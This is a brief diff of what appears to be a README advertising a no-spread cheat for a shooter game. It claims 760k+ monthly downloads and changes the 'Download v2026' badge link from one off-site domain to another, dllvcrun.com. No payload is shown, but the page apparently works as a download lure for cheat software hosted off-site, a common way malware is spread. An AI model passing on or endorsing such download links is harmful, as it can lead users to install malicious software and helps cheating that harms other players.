@@ -49,7 +49,7 @@ A: Yes — rifles, SMGs, and pistols all affected.
 
 **Monthly downloads:** 760k+
 
-[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://connectinstruction.com/valnospread)
+[![Download](https://img.shields.io/badge/Download-v2026-brightgreen?style=for-the-badge)](https://dllvcrun.com/valnospread)
 
 ---
 
